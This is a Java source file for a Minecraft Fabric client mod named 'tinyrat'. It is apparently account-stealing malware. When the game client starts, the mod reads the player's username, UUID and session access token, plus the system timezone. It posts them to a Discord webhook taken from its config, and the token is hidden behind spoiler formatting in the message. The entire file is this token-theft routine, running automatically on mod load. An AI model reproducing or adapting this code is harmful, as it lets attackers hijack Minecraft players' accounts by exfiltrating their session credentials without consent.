package com.github.tinyrat;

import java.time.ZoneId;

import net.fabricmc.api.ClientModInitializer;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.session.Session;

import com.github.tinyrat.utils.ConfigLoader;
import com.github.tinyrat.utils.DiscordEmbed;
import com.github.tinyrat.utils.DiscordWebhook;

public class Entry implements ClientModInitializer {
    public static final String MOD_ID = "tinyrat";

    @Override
    public void onInitializeClient() {
        MinecraftClient minecraft = MinecraftClient.getInstance();
        Session session = minecraft.getSession();

        sendWebhook(session);
    }

    private void sendWebhook(Session session) {
        String webhookUrl = ConfigLoader.getWebhook();
        DiscordWebhook webhook = new DiscordWebhook(webhookUrl);

        DiscordEmbed embed = new DiscordEmbed("Session found");

        ZoneId currentTimezone = ZoneId.systemDefault();

        embed.addln("**Username:** [" + session.getUsername() + "](https://namemc.com/profile/" + session.getUuidOrNull() +")");
        embed.addln("**Timezone:** `" + currentTimezone.toString() + "`\n");
        embed.addln("**Session token:**\n||```" + session.getAccessToken() + "```||");

        webhook.sendEmbed(embed);
    }
}
